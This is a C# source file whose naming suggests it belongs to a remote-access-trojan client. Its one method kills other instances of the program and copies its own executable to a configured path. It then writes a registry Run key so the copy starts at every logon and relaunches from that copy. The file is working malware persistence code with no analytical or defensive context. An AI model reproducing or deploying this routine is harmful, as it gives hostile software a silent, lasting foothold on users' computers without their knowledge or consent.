using Client.Helper;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                if (Process.GetCurrentProcess().MainModule.FileName != Settings.ClientFullPath)
                {
                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == Settings.ClientFullPath)
                                P.Kill();
                        }
                        catch
                        {
                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
                        }
                    }

                    FileStream fs;
                    if (File.Exists(Settings.ClientFullPath))
                        fs = new FileStream(Settings.ClientFullPath, FileMode.Create);
                    else
                        fs = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    fs.Write(clientExe, 0, clientExe.Length);
                    fs.Dispose();

                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath);
                    Methods.CloseMutex();
                    Process.Start(Settings.ClientFullPath);
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
